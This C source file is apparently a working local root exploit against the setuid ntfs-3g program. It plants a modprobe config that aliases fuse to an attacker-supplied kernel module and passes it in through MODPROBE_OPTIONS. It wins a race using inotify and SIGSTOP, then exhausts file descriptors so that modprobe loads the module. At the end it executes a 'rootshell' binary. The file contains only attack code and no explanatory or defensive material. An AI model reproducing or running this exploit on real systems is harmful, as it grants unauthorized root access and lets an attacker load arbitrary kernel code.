#define _GNU_SOURCE
#include <stdbool.h>
#include <errno.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <err.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/eventfd.h>
#include <signal.h>
#include <poll.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/utsname.h>

int main(void) {
	/* prevent shell from backgrounding ntfs-3g when stopped */
	pid_t initial_fork_child = fork();
	if (initial_fork_child == -1)
		err(1, "initial fork");
	if (initial_fork_child != 0) {
		int status;
		if (waitpid(initial_fork_child, &status, 0) != initial_fork_child)
			err(1, "waitpid");
		execl("rootshell", "rootshell", NULL);
		exit(0);
	}

	char buf[1000] = {0};
	// Set up workspace with volume, mountpoint, modprobe config and module directory.
	char template[] = "/tmp/ntfs_sploit.XXXXXX";
	if (mkdtemp(template) == NULL)
		err(1, "mkdtemp");
	char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];
	sprintf(volume, "%s/volume", template);
	sprintf(mountpoint, "%s/mountpoint", template);
	sprintf(modprobe_confdir, "%s/modprobe.d", template);
	sprintf(modprobe_conffile, "%s/sploit.conf", modprobe_confdir);
	if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777))
		err(1, "mkdir");
	int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);
	if (conffd == -1)
		err(1, "open modprobe config");
	int suidfile_fd = open("rootshell", O_RDONLY);
	if (suidfile_fd == -1)
		err(1, "unable to open ./rootshell");
	char modprobe_config[200];
	sprintf(modprobe_config, "alias fuse rootmod\noptions rootmod suidfile_fd=%d\n", suidfile_fd);
	if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config))
		errx(1, "modprobe config write failed");
	close(conffd);
	// module directory setup
	char system_cmd[1000];
	sprintf(system_cmd, "mkdir -p %s/lib/modules/$(uname -r) && cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/",
		template, template);
	if (system(system_cmd))
		errx(1, "shell command failed");

	// Set up inotify watch for /proc/mounts.
	// Note: /proc/mounts is a symlink to /proc/self/mounts, so
	// the watch will only see accesses by this process.
	int inotify_fd = inotify_init1(IN_CLOEXEC);
	if (inotify_fd == -1)
		err(1, "unable to create inotify fd?");
	if (inotify_add_watch(inotify_fd, "/proc/mounts", IN_OPEN) == -1)
		err(1, "unable to watch /proc/mounts");

	// Set up inotify watch for /proc/filesystems.
	// This can be used to detect whether we lost the race.
	int fs_inotify_fd = inotify_init1(IN_CLOEXEC);
	if (fs_inotify_fd == -1)
		err(1, "unable to create inotify fd?");
	if (inotify_add_watch(fs_inotify_fd, "/proc/filesystems", IN_OPEN) == -1)
		err(1, "unable to watch /proc/filesystems");

	// Set up inotify watch for /sbin/modprobe.
	// This can be used to detect when we can release all our open files.
	int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);
	if (modprobe_inotify_fd == -1)
		err(1, "unable to create inotify fd?");
	if (inotify_add_watch(modprobe_inotify_fd, "/sbin/modprobe", IN_OPEN) == -1)
		err(1, "unable to watch /sbin/modprobe");

	int do_exec_pipe[2];
	if (pipe2(do_exec_pipe, O_CLOEXEC))
		err(1, "pipe");
	pid_t child = fork();
	if (child == -1)
		err(1, "fork");
	if (child != 0) {
		if (read(do_exec_pipe[0], buf, 1) != 1)
			errx(1, "pipe read failed");
		char modprobe_opts[300];
		sprintf(modprobe_opts, "-C %s -d %s", modprobe_confdir, template);
		setenv("MODPROBE_OPTIONS", modprobe_opts, 1);
		execlp("ntfs-3g", "ntfs-3g", volume, mountpoint, NULL);
	}
	child = getpid();

	// Now launch ntfs-3g and wait until it opens /proc/mounts
	if (write(do_exec_pipe[1], buf, 1) != 1)
		errx(1, "pipe write failed");

	if (read(inotify_fd, buf, sizeof(buf)) <= 0)
		errx(1, "inotify read failed");
	if (kill(getppid(), SIGSTOP))
		err(1, "can't stop setuid parent");

	// Check whether we won the main race.
	struct pollfd poll_fds[1] = {{
		.fd = fs_inotify_fd,
		.events = POLLIN
	}};
	int poll_res = poll(poll_fds, 1, 100);
	if (poll_res == -1)
		err(1, "poll");
	if (poll_res == 1) {
		puts("looks like we lost the race");
		if (kill(getppid(), SIGKILL))
			perror("SIGKILL after lost race");
		char rm_cmd[100];
		sprintf(rm_cmd, "rm -rf %s", template);
		system(rm_cmd);
		exit(1);
	}
	puts("looks like we won the race");

	// Open as many files as possible. Whenever we have
	// a bunch of open files, move them into a new process.
	int total_open_files = 0;
	while (1) {
		#define LIMIT 500
		int open_files[LIMIT];
		bool reached_limit = false;
		int n_open_files;
		for (n_open_files = 0; n_open_files < LIMIT; n_open_files++) {
			open_files[n_open_files] = eventfd(0, 0);
			if (open_files[n_open_files] == -1) {
				if (errno != ENFILE)
					err(1, "eventfd() failed");
				printf("got ENFILE at %d total\n", total_open_files);
				reached_limit = true;
				break;
			}
			total_open_files++;
		}
		pid_t fd_stasher_child = fork();
		if (fd_stasher_child == -1)
			err(1, "fork (for eventfd holder)");
		if (fd_stasher_child == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL);
			// close PR_SET_PDEATHSIG race window
			if (getppid() != child) raise(SIGKILL);
			while (1) pause();
		}
		for (int i = 0; i < n_open_files; i++)
			close(open_files[i]);
		if (reached_limit)
			break;
	}

	// Wake up ntfs-3g and keep allocating files, then free up
	// the files as soon as we're reasonably certain that either
	// modprobe was spawned or the attack failed.
	if (kill(getppid(), SIGCONT))
		err(1, "SIGCONT");

	time_t start_time = time(NULL);
	while (1) {
		for (int i=0; i<1000; i++) {
			int efd = eventfd(0, 0);
			if (efd == -1 && errno != ENFILE)
				err(1, "gapfiller eventfd() failed unexpectedly");
		}
		struct pollfd modprobe_poll_fds[1] = {{
			.fd = modprobe_inotify_fd,
			.events = POLLIN
		}};
		int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0);
		if (modprobe_poll_res == -1)
			err(1, "poll");
		if (modprobe_poll_res == 1) {
			puts("yay, modprobe ran!");
			exit(0);
		}
		if (time(NULL) > start_time + 3) {
			puts("modprobe didn't run?");
			exit(1);
		}
	}
}
